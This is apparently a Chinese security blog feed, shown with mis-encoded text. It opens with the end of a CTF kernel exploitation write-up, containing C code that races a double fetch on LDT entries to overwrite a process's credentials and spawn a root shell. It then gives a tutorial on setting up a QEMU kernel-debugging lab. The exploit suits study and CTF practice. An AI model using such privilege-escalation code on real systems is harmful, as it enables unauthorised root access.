<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// arch/x86/include/uapi/asm/ldt.h</span></span><br><span class="line"><span class="comment">/* Maximum number of LDT entries supported. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LDT_ENTRIES	8192</span></span><br><span class="line"><span class="comment">/* The size of each LDT entry. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LDT_ENTRY_SIZE	8</span></span><br></pre></td></tr></table></figure>
<p>æ‰€ä»¥é€šè¿‡ double fetch è¿›è¡Œææƒï¼Œæ­¥éª¤å¦‚ä¸‹ï¼š</p>
<ol>
<li>å°† cred ç»“æ„ä½“çš„åœ°å€é€šè¿‡ UAF å†™åœ¨ ldt-&gt;entries ä¸Š</li>
<li>é€šè¿‡ <code>new_ldt-&gt;entries[ldt_info.entry_number] = ldt;</code> å®ç°ä»»æ„å†™</li>
</ol>
<p>ä¸ºäº†æé«˜æˆåŠŸç‡ï¼Œå°†è¿›ç¨‹ç»‘å®šåœ¨å•ä¸ª CPU ä¸Šï¼Œææƒä»£ç å¦‚ä¸‹</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> ret=fork();</span><br><span class="line"><span class="keyword">if</span> (!ret)&#123;</span><br><span class="line">    ret = fork();</span><br><span class="line">    <span class="keyword">if</span> (!ret)&#123;</span><br><span class="line">        <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line">        CPU_ZERO(&amp;cpu_set);</span><br><span class="line">        CPU_SET(<span class="number">0</span>,&amp;cpu_set);</span><br><span class="line">        sched_setaffinity(<span class="number">0</span>,<span class="keyword">sizeof</span>(cpu_set),&amp;cpu_set);</span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;<span class="number">15</span>;i++)&#123;</span><br><span class="line">            alloc_entry(i);</span><br><span class="line">        &#125;</span><br><span class="line">        set_note(<span class="number">11</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">1</span>; i&lt;<span class="number">15</span>; i++)&#123;</span><br><span class="line">            free_entry(i);</span><br><span class="line">        &#125;</span><br><span class="line">        CPU_ZERO(&amp;cpu_set);</span><br><span class="line">        CPU_SET(<span class="number">1</span>,&amp;cpu_set);</span><br><span class="line">        sched_setaffinity(<span class="number">0</span>,<span class="keyword">sizeof</span>(cpu_set),&amp;cpu_set);</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">            write_note(cred_addr+<span class="number">4</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(<span class="number">0</span>,&amp;cpu_set);</span><br><span class="line">    sched_setaffinity(<span class="number">0</span>,<span class="keyword">sizeof</span>(cpu_set),&amp;cpu_set);</span><br><span class="line">    udesc.base_addr=<span class="number">0</span>;</span><br><span class="line">    udesc.entry_number=<span class="number">2</span>;</span><br><span class="line">    udesc.limit=<span class="number">0</span>;</span><br><span class="line">    udesc.seg_32bit=<span class="number">0</span>;</span><br><span class="line">    udesc.contents=<span class="number">0</span>;</span><br><span class="line">    udesc.read_exec_only=<span class="number">0</span>;</span><br><span class="line">    udesc.limit_in_pages=<span class="number">0</span>;</span><br><span class="line">    udesc.seg_not_present=<span class="number">0</span>;</span><br><span class="line">    udesc.useable=<span class="number">0</span>;</span><br><span class="line">    udesc.lm=<span class="number">0</span>;</span><br><span class="line">    sleep(<span class="number">3</span>);</span><br><span class="line">    syscall(SYS_modify_ldt, <span class="number">1</span>, &amp;udesc,<span class="keyword">sizeof</span>(udesc));</span><br><span class="line">    sleep(<span class="number">114514</span>);</span><br><span class="line">&#125;</span><br><span class="line">sleep(<span class="number">10</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,geteuid());</span><br><span class="line">setreuid(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">setregid(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>è¿™ç§ç‰¹æƒæå‡æ–¹å¼æœ‰ç‚¹é—®é¢˜ï¼Œä¹‹å‰å°è¯•äº†åæ¥æ¬¡æ‰æˆåŠŸ root</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>PWN</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>kernel</tag>
      </tags>
  </entry>
  <entry>
    <title>Kernel Pwn ç¯å¢ƒæ­å»ºåŠåŸºç¡€çŸ¥è¯†</title>
    <url>/2022/05/05/Kernel-Pwn-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
    <content><![CDATA[<span id="more"></span>
<p>æœ¬æ–‡ä¸»è¦å‚è€ƒ <a href="https://ctf-wiki.org/pwn/linux/kernel-mode/environment/qemu-emulate/">CTF-wiki</a> å’Œ <a href="https://kiprey.github.io/2021/10/kernel_pwn_introduction/">kiprey</a></p>
<h3 id="ç³»ç»Ÿç¯å¢ƒ"><a href="#ç³»ç»Ÿç¯å¢ƒ" class="headerlink" title="ç³»ç»Ÿç¯å¢ƒ"></a>ç³»ç»Ÿç¯å¢ƒ</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">HOST OS Platform: macOS</span><br><span class="line">HOST OS Version: 10.15</span><br><span class="line">è™šæ‹Ÿæœºè½¯ä»¶ï¼šVMware Fusion 12</span><br><span class="line">OS Platform:  Linux Ubuntu</span><br><span class="line">OS Version: 18.04</span><br><span class="line">Python Version: 3.6.9 (default)</span><br></pre></td></tr></table></figure>

<h3 id="ç¯å¢ƒé…ç½®"><a href="#ç¯å¢ƒé…ç½®" class="headerlink" title="ç¯å¢ƒé…ç½®"></a>ç¯å¢ƒé…ç½®</h3><p><strong>gdb æ’ä»¶å®‰è£…</strong><br>è°ƒè¯•å†…æ ¸éœ€è¦ä¼˜ç§€çš„ gdb æ’ä»¶ï¼Œç°æœ‰çš„æ’ä»¶æœ‰ <code>gef</code> <code>pwndbg</code> <code>peda</code>ï¼Œæœ‰å¸ˆå‚…æ¨è gefï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥ç›´æ¥å…¨éƒ¨å®‰è£…</p>
<p>è„šæœ¬åœ°å€ï¼š<a href="https://github.com/apogiatzis/gdb-peda-pwndbg-gef">https://github.com/apogiatzis/gdb-peda-pwndbg-gef</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~ &amp;&amp; git <span class="built_in">clone</span> https://github.com/apogiatzis/gdb-peda-pwndbg-gef.git</span><br><span class="line"><span class="built_in">cd</span> ~/gdb-peda-pwndbg-gef</span><br><span class="line">./install.sh</span><br></pre></td></tr></table></figure>
<p>è¿™æ ·å°±ä¸ç”¨è€ƒè™‘ä»¥åä½¿ç”¨å…¶ä»–æ’ä»¶çš„é—®é¢˜äº†</p>
<p><strong>å†…æ ¸é…ç½®</strong><br>å®˜æ–¹çš„å†…æ ¸ç½‘å€ï¼š<a href="https://www.kernel.org/category/releases.html">https://www.kernel.org/category/releases.html</a><br>ä¸€èˆ¬é€‰ç”¨ Longtermï¼Œå³é•¿æœŸæ”¯æŒç‰ˆ</p>
<p>å›½å†…æœ‰å¾ˆå¤šé•œåƒæ–‡ä»¶æºï¼Œä¸Šæµ·ç¦»ä¸­ç§‘å¤§æ¯”è¾ƒè¿‘ï¼Œå› æ­¤æˆ‘ä»¬é€‰ç”¨ç§‘å¤§æº <a href="https://mirrors.ustc.edu.cn/kernel.org/linux/kernel/">https://mirrors.ustc.edu.cn/kernel.org/linux/kernel/</a></p>
<p>ä»¥ <code>linux-5.17.5.tar.xz</code> ä¸ºä¾‹ï¼Œå¯ä»¥çœ‹åˆ°å†…æ ¸çš„å…¨éƒ¨æ–‡ä»¶</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">embeded@ubuntu:~/Desktop$ wget -c https://mirrors.ustc.edu.cn/kernel.org/linux/kernel/v5.x/linux-5.17.5.tar.xz</span><br><span class="line"></span><br><span class="line">embeded@ubuntu:~/Desktop$ unxz linux-5.17.5.tar.xz </span><br><span class="line">embeded@ubuntu:~/Desktop$ tar -xf linux-5.17.5.tar</span><br><span class="line">embeded@ubuntu:~/Desktop$ <span class="built_in">cd</span> linux-5.17.5/</span><br><span class="line">embeded@ubuntu:~/Desktop/linux-5.17.5$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">arch</span>     CREDITS        fs       Kbuild   LICENSES     net      security  virt</span><br><span class="line">block    crypto         include  Kconfig  MAINTAINERS  README   sound</span><br><span class="line">certs    Documentation  init     kernel   Makefile     samples  tools</span><br><span class="line">COPYING  drivers        ipc      lib      mm           scripts  usr</span><br></pre></td></tr></table></figure>

<p><strong>äº¤æ¢æ–‡ä»¶æ‰©å……ï¼ˆå¯é€‰ï¼‰</strong><br>ç”±äºé€‰æ‹©åœ¨è™šæ‹Ÿæœºä¸Šè¿›è¡Œè°ƒè¯•ï¼Œåœ¨ç¼–è¯‘æˆ–è€…å…¶ä»–æ“ä½œæ—¶å¯èƒ½ä¼šå‡ºç°å†…å­˜çˆ†ç‚¸ï¼Œè¿™é‡Œæˆ‘é€‰æ‹©åŠ ä¸€ä¸ªäº¤æ¢ç©ºé—´</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@ubuntu:/home/embeded<span class="comment"># dd if=/dev/zero of=swapfile bs=1M count=5120</span></span><br><span class="line">root@ubuntu:/home/embeded<span class="comment"># mkswap swapfile</span></span><br><span class="line">root@ubuntu:/home/embeded<span class="comment"># chmod 0600 swapfile</span></span><br><span class="line">root@ubuntu:/home/embeded<span class="comment"># swapon swapfile</span></span><br></pre></td></tr></table></figure>

<p><strong>é…ç½®ç¼–è¯‘é€‰é¡¹</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo apt install libncurses5-dev</span><br><span class="line">$ sudo apt install flex</span><br><span class="line">$ sudo apt install bison</span><br><span class="line">$ sudo apt install libssl-dev</span><br><span class="line">$ sudo apt install libelf-dev</span><br><span class="line">$ sudo apt install dwarves</span><br><span class="line"></span><br><span class="line">$ make menuconfig</span><br><span class="line"></span><br><span class="line">Kernel Hacking-&gt;Compile-checks and compiler options </span><br><span class="line">-&gt; Compile the kernel with debug info <span class="comment"># ä¾¿äºè°ƒè¯•ï¼Œä¸€èˆ¬é»˜è®¤æ‰“å¼€</span></span><br><span class="line">Generic Kernel Debugging Instruments</span><br><span class="line">-&gt; KGDBï¼škernel debugger <span class="comment"># KGDB è°ƒè¯•å†…æ ¸ï¼Œä¸€èˆ¬é»˜è®¤æ‰“å¼€</span></span><br></pre></td></tr></table></figure>

<p><strong>ç¼–è¯‘å†…æ ¸</strong><br>ç¼–è¾‘å†…æ ¸é•œåƒï¼Œå»ºè®®ä¸è¦é€‰æ‹©å¤ªé«˜ï¼Œæ ¹æ®æœºå™¨æ€§èƒ½è€Œå®š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ make -j 4 bzImage</span><br><span class="line">...</span><br><span class="line">  AS      <span class="built_in">arch</span>/x86/boot/header.o</span><br><span class="line">  LD      <span class="built_in">arch</span>/x86/boot/setup.elf</span><br><span class="line">  OBJCOPY <span class="built_in">arch</span>/x86/boot/setup.bin</span><br><span class="line">  BUILD   <span class="built_in">arch</span>/x86/boot/bzImage</span><br><span class="line">Kernel: <span class="built_in">arch</span>/x86/boot/bzImage is ready  (<span class="comment">#2)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># bzImage: ä¸»æµ Kernel é•œåƒæ ¼å¼ï¼Œé€‚ç”¨äºè¾ƒå¤§çš„ Kernel</span></span><br><span class="line">embeded@ubuntu:~/Desktop/linux-5.17.5$ binwalk ./arch/x86/boot/bzImage</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             Microsoft executable, portable (PE)</span><br><span class="line">16588         0x40CC          gzip compressed data, maximum compression, from Unix, last modified: 1970-01-01 00:00:00 (null <span class="built_in">date</span>)</span><br><span class="line">7898753       0x788681        Cisco IOS microcode, <span class="keyword">for</span> <span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<p>:warning: æŠ¥é”™ä¿¡æ¯ </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">make[1]: *** No rule to make target &#x27;debian/canonical-certs.pem&#x27;, needed by &#x27;certs/x509_certificate_list&#x27;.  Stop.</span><br><span class="line">make[1]: *** Waiting for unfinished jobs....</span><br><span class="line"></span><br><span class="line">è§£å†³åŠæ³•ï¼šç›´æ¥ä¿®æ”¹ .config æ–‡ä»¶ï¼Œå°† CONFIG_SYSTEM_TRUSTED_KEYS CONFIG_SYSTEM_REVOCATION_KEYS ç½®ç©º</span><br></pre></td></tr></table></figure>

<p><strong>æ„å»ºæ–‡ä»¶ç³»ç»Ÿ</strong><br>ä¸‹è½½ busybox æºä»£ç ï¼Œå¹¶ç¼–è¯‘</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">embeded@ubuntu:~/Desktop$ wget -c https://busybox.net/downloads/busybox-1.35.0.tar.bz2</span><br><span class="line">embeded@ubuntu:~/Desktop$ tar -jxf busybox-1.35.0.tar.bz2</span><br><span class="line"></span><br><span class="line">embeded@ubuntu:~/Desktop$ <span class="built_in">cd</span> busybox-1.35.0/</span><br><span class="line">embeded@ubuntu:~/Desktop/busybox-1.35.0$ make menuconfig</span><br><span class="line"></span><br><span class="line">Settings -&gt; Build static binary (no shared libs) <span class="comment"># kernel ä¸æä¾› libc</span></span><br><span class="line">å…³é—­ Linux System Utilities -&gt; Support mounting NFS file systems on Linux &lt; 2.6.23 <span class="comment"># ä¸€èˆ¬é»˜è®¤ä¸æ‰“å¼€</span></span><br><span class="line"></span><br><span class="line">embeded@ubuntu:~/Desktop/busybox-1.35.0$ make -j 4</span><br></pre></td></tr></table></figure>
<p>é…ç½®æ–‡ä»¶ç³»ç»Ÿ</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">embeded@ubuntu:~/Desktop/busybox-1.35.0$ make install</span><br><span class="line">embeded@ubuntu:~/Desktop/busybox-1.35.0$ <span class="built_in">cd</span> _install</span><br><span class="line">embeded@ubuntu:~/Desktop/busybox-1.35.0$ <span class="built_in">mkdir</span> -p proc sys dev etc/init.d </span><br></pre></td></tr></table></figure>
<p>ç¼–å†™æŒ‚è½½è„šæœ¬ initï¼Œè®¾ç½®æƒé™å¹¶æ‰“åŒ…æ–‡ä»¶ç³»ç»Ÿ</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">embeded@ubuntu:~/Desktop/busybox-1.35.0/_install$ gedit init</span><br><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;INIT SCRIPT&quot;</span></span><br><span class="line"><span class="built_in">mkdir</span> /tmp</span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">mount -t debugfs none /sys/kernel/debug</span><br><span class="line">mount -t tmpfs none /tmp</span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;Boot took <span class="subst">$(cut -d&#x27; &#x27; -f1 /proc/uptime)</span> seconds&quot;</span></span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br><span class="line"></span><br><span class="line">embeded@ubuntu:~/Desktop/busybox-1.35.0/_install$ <span class="built_in">chmod</span> +x ./init</span><br><span class="line"></span><br><span class="line">embeded@ubuntu:~/Desktop/busybox-1.35.0/_install$ find . | cpio -o --format=newc &gt; ../../rootfs.img</span><br></pre></td></tr></table></figure>
<p><strong>å¯åŠ¨å†…æ ¸</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">embeded@ubuntu:~/Desktop$ qemu-system-x86_64 -nographic -kernel ./linux-5.17.5/arch/x86/boot/bzImage -initrd ./rootfs.img -append <span class="string">&quot;root=/dev/ram rw console=ttyS0 nokaslr&quot;</span> -smp cores=2,threads=1 -cpu kvm64</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">INIT SCRIPT</span><br><span class="line">Boot took 1.71 seconds</span><br><span class="line">/ $ [    1.718707] tsc: Refined TSC clocksource calibration: 2303.917 MHz</span><br><span class="line">[    1.719573] clocksource: tsc: mask: 0xffffffffffffffff max_cycles: 0x2135a96e28b, max_idle_ns: 440795251144 ns</span><br><span class="line">[    1.721389] clocksource: Switched to clocksource tsc</span><br><span class="line"></span><br><span class="line">/ $ </span><br><span class="line">/ $ <span class="built_in">ls</span></span><br><span class="line">bin      etc      linuxrc  root     sys      usr</span><br><span class="line">dev      init     proc     sbin     tmp</span><br></pre></td></tr></table></figure>
<p>:warning: è¿™é‡ŒæŒ‰ç…§ <a href="https://ctf-wiki.org/pwn/linux/kernel-mode/environment/qemu-emulate/#_10">CTF-wiki</a> çš„å†™æ³•æˆ‘çš„QEMUè·‘ä¸èµ·æ¥ï¼Œå°† <code>-m</code> å‚æ•°åˆ é™¤ï¼ŒçŒœæµ‹å¯èƒ½æ˜¯å†…æ ¸ç‰ˆæœ¬è¿‡é«˜ï¼Œå†…å­˜è®¾ç½®ä¸è¶³å¯¼è‡´</p>
<h3 id="å†…æ ¸é©±åŠ¨ç¼–å†™ä¸è°ƒè¯•"><a href="#å†…æ ¸é©±åŠ¨ç¼–å†™ä¸è°ƒè¯•" class="headerlink" title="å†…æ ¸é©±åŠ¨ç¼–å†™ä¸è°ƒè¯•"></a>å†…æ ¸é©±åŠ¨ç¼–å†™ä¸è°ƒè¯•</h3><p><strong>é©±åŠ¨ç¼–å†™ä¸ç¼–è¯‘</strong><br>åœ¨å†…æ ¸æºç ç›®å½•ä¸‹æ„å»ºæ–‡ä»¶å¤¹</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">embeded@ubuntu:~/Desktop/linux-5.17.5$ <span class="built_in">mkdir</span> mydriver</span><br><span class="line">embeded@ubuntu:~/Desktop/linux-5.17.5$ <span class="built_in">cd</span> mydriver/</span><br></pre></td></tr></table></figure>
<p>åœ¨ç›®å½•ä¸‹æ„å»ºé©±åŠ¨ä»£ç  <code>ko_test.c</code>ï¼ŒåŸå°ä¸åŠ¨ç…§æŠ„</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;Dual BSD/GPL&quot;</span>);</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">ko_test_init</span><span class="params">(<span class="type">void</span>)</span> </span><br><span class="line">&#123;</span><br><span class="line">    printk(<span class="string">&quot;This is a test ko!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">ko_test_exit</span><span class="params">(<span class="type">void</span>)</span> </span><br><span class="line">&#123;</span><br><span class="line">    printk(<span class="string">&quot;Bye Bye~\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">module_init(ko_test_init);</span><br><span class="line">module_exit(ko_test_exit);</span><br></pre></td></tr></table></figure>
<p>æ·»åŠ  <code>Makefile</code> æ–‡ä»¶</p>
<figure class="highlight mk"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æŒ‡å®šå£°ç§°å“ªäº› å†…æ ¸æ¨¡å—</span></span><br><span class="line">obj-m += ko_test.o</span><br><span class="line"></span><br><span class="line"><span class="comment"># æŒ‡å®šå†…æ ¸é¡¹ç›®è·¯å¾„</span></span><br><span class="line">KDIR =/home/embeded/Desktop/linux-5.17.5</span><br><span class="line"></span><br><span class="line"><span class="section">all:</span></span><br><span class="line">        <span class="comment"># -C å‚æ•°æŒ‡å®šè¿›å…¥å†…æ ¸é¡¹ç›®è·¯å¾„</span></span><br><span class="line">        <span class="comment"># -M æŒ‡å®šé©±åŠ¨æºç çš„ç¯å¢ƒï¼Œä½¿ Makefile åœ¨æ„å»ºæ¨¡å—ä¹‹å‰è¿”å›åˆ° é©±åŠ¨æºç  ç›®å½•ï¼Œå¹¶åœ¨è¯¥ç›®å½•ä¸­ç”Ÿæˆé©±åŠ¨æ¨¡å—</span></span><br><span class="line">        <span class="variable">$(MAKE)</span> -C <span class="variable">$(KDIR)</span> M=<span class="variable">$(PWD)</span> modules</span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">        rm -rf *.o *.ko *.mod.* *.symvers *.order</span><br></pre></td></tr></table></figure>
<p>è¿›è¡Œç¼–è¯‘</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">embeded@ubuntu:~/Desktop/linux-5.17.5/mydriver$ make</span><br><span class="line">make -C /home/embeded/Desktop/linux-5.17.5/ M=/home/embeded/Desktop/linux-5.17.5/mydriver modules</span><br><span class="line">make[1]: Entering directory <span class="string">&#x27;/home/embeded/Desktop/linux-5.17.5&#x27;</span></span><br><span class="line">  CC [M]  /home/embeded/Desktop/linux-5.17.5/mydriver/ko_test.o</span><br><span class="line">  MODPOST /home/embeded/Desktop/linux-5.17.5/mydriver/Module.symvers</span><br><span class="line">  CC [M]  /home/embeded/Desktop/linux-5.17.5/mydriver/ko_test.mod.o</span><br><span class="line">  LD [M]  /home/embeded/Desktop/linux-5.17.5/mydriver/ko_test.ko</span><br><span class="line">make[1]: Leaving directory <span class="string">&#x27;/home/embeded/Desktop/linux-5.17.5&#x27;</span></span><br></pre></td></tr></table></figure>
<p>:warning:  <code>Makefile:9: *** missing separator (did you mean TAB instead of 8 spaces?).  Stop.</code><br>è§£å†³åŠæ³•ï¼švim æ‰“å¼€è¿›è¡Œä¿®æ”¹</p>
<p>:warning: <code>WARNING: Symbol version dump &quot;Module.symvers&quot; is missing. Modules may not have dependencies or modversions.</code><br>è§£å†³æ–¹å¼ï¼šå›åˆ°å†…æ ¸æºç ç›®å½•ï¼Œæ‰§è¡Œ <code>make -j 4 modules</code>ï¼Œåœ¨ç¼–è¯‘æ¨¡å—çš„è¿‡ç¨‹ä¸­ï¼Œå¯ä»¥çœ‹åˆ° <code>GEN     Module.symvers</code>ï¼Œç¼–è¯‘å®Œæˆåé‡æ–°ç¼–è¯‘è‡ªå®šä¹‰æ¨¡å—</p>
<p><strong>é©±åŠ¨è¿è¡Œ</strong><br>å°†ç¼–è¯‘å‡ºæ¥çš„ <code>*.ko</code> æ–‡ä»¶å¤åˆ¶åˆ° rootfs æ–‡ä»¶å¤¹ï¼Œå³ <code>busybox*/_install</code>ï¼Œä¿®æ”¹è¿è¡Œè„šæœ¬æ–‡ä»¶ï¼Œææƒè¿è¡Œå¹¶æŒ‚è½½æ¨¡å—</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;INIT SCRIPT&quot;</span></span><br><span class="line"><span class="built_in">mkdir</span> /tmp</span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">mount -t debugfs none /sys/kernel/debug</span><br><span class="line">mount -t tmpfs none /tmp</span><br><span class="line">+ insmod /ko_test.ko <span class="comment"># æŒ‚è½½å†…æ ¸æ¨¡å—</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;Boot took <span class="subst">$(cut -d&#x27; &#x27; -f1 /proc/uptime)</span> seconds&quot;</span></span><br><span class="line">- setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br><span class="line">+ setsid /bin/cttyhack setuidgid 0 /bin/sh <span class="comment"># ä¿®æ”¹ uid gid ä¸º 0 ä»¥ææƒ /bin/sh è‡³ rootã€‚</span></span><br><span class="line">+ poweroff -f <span class="comment"># è®¾ç½® shell é€€å‡ºååˆ™å…³é—­æœºå™¨</span></span><br></pre></td></tr></table></figure>
<p>é‡æ–°æ‰“åŒ… <code>rootfs</code> å¹¶è¿è¡Œ <code>qemu</code>ï¼ŒæŸ¥çœ‹ <code>dmesg</code> ä¿¡æ¯</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[    2.159687] ko_test: loading out-of-tree module taints kernel.</span><br><span class="line">[    2.160878] ko_test: module verification failed: signature and/or required key missing - tainting kernel</span><br><span class="line">[    2.165558] This is a <span class="built_in">test</span> ko!</span><br><span class="line">Boot took 2.14 seconds</span><br><span class="line">/ <span class="comment"># lsmod</span></span><br><span class="line">ko_test 16384 0 - Live 0xffffffffc0002000 (OE)</span><br></pre></td></tr></table></figure>

<p><strong>é©±åŠ¨è°ƒè¯•ï¼šé™„åŠ QEMU</strong><br>qemu æ‹¥æœ‰è°ƒè¯•æ¥å£ï¼Œå¯ä»¥é€šè¿‡æŒ‡å®šå‚æ•° <code>-gdb tcp::1234</code> æˆ–ç­‰ä»·ç¬¦å· <code>-s</code>ï¼Œå¦‚æœå¸Œæœ› qemu å¯åŠ¨åç«‹åˆ»æŒ‚èµ·ï¼Œåˆ™éœ€è¦æŒ‡å®š <code>-S</code></p>
<p>è°ƒè¯•å†…æ ¸æ—¶ä¸ºäº†åŠ è½½ vmlinux ç¬¦å·è¡¨ï¼Œéœ€è¦ç¡®ä¿æŒ‡å®š <code>-append &quot;nokaslr&quot;</code>ï¼Œå¦åˆ™æ— æ³•ç»™ç›®æ ‡å‡½æ•°ä¸‹æ–­ç‚¹<br>å³æ¨¡æ‹Ÿå‘½ä»¤ä¸º</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">embeded@ubuntu:~/Desktop$ qemu-system-x86_64 -s -S -nographic -kernel ./linux-5.17.5/arch/x86/boot/bzImage -initrd ./rootfs.img -append <span class="string">&quot;root=/dev/ram rw console=ttyS0 nokaslr&quot;</span> -smp cores=2,threads=1 -cpu kvm64</span><br></pre></td></tr></table></figure>
<p>qemu å¯åŠ¨åå¦èµ·ç»ˆç«¯ï¼Œæ‰§è¡Œå‘½ä»¤ <code>gdb -q -ex &quot;target remote localhost::1234&quot;</code> å³å¯é™„åŠ åˆ° QEMU ä¸Š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">embeded@ubuntu:~/Desktop/linux-5.17.5$ gdb-gef -q -ex <span class="string">&quot;target remote localhost:1234&quot;</span></span><br></pre></td></tr></table></figure>
<p>é€šè¿‡æ·»åŠ ç¬¦å·è¡¨å¯ä»¥ç»™ç‰¹å®šå‡½æ•°ä¸‹æ–­ç‚¹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gefâ¤  file ./vmlinux</span><br><span class="line">Reading symbols from ./vmlinux...done.</span><br><span class="line">gefâ¤  b start_kernel</span><br><span class="line">Breakpoint 1 at 0xffffffff831c7d55: file init/main.c, line 929.</span><br><span class="line">gefâ¤  c</span><br><span class="line">Continuing.</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥é€šè¿‡ä»¥ä¸‹å‘½ä»¤æŸ¥çœ‹å†…æ ¸ä¸­çš„ç¬¦å·ä¿¡æ¯(åŠ è½½åœ°å€)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/ <span class="comment"># grep prepare_kernel_cred  /proc/kallsyms</span></span><br><span class="line">ffffffff810d8410 T prepare_kernel_cred</span><br><span class="line">ffffffff826eda20 r __ksymtab_prepare_kernel_cred</span><br><span class="line">ffffffff82713b4a r __kstrtab_prepare_kernel_cred</span><br><span class="line">ffffffff827189f9 r __kstrtabns_prepare_kernel_cred</span><br><span class="line">/ <span class="comment"># grep commit_creds  /proc/kallsyms</span></span><br><span class="line">ffffffff810d8160 T commit_creds</span><br><span class="line">ffffffff826e5884 r __ksymtab_commit_creds</span><br><span class="line">ffffffff82713b0a r __kstrtab_commit_creds</span><br><span class="line">ffffffff827189f9 r __kstrtabns_commit_creds</span><br><span class="line">/ <span class="comment"># grep ko_test_init  /proc/kallsyms</span></span><br><span class="line">ffffffffc0002000 t ko_test_init	[ko_test]</span><br></pre></td></tr></table></figure>

<p>è£…è½½æ¨¡å—å’Œå¸è½½æ¨¡å—çš„å‘½ä»¤</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/ <span class="comment"># insmod mod_name</span></span><br><span class="line">/ <span class="comment"># rmmod mod_name</span></span><br></pre></td></tr></table></figure>

<p><strong>é©±åŠ¨è°ƒè¯•ï¼šé™„åŠ é©±åŠ¨</strong><br>åœ¨é©±åŠ¨è£…è½½è¿›å†…æ ¸ä¹‹åï¼Œé¦–å…ˆæŸ¥çœ‹å·²ç»åŠ è½½çš„æ¨¡å—ï¼Œå¹¶è·å–é©±åŠ¨åŠ è½½çš„åŸºåœ°å€</p>
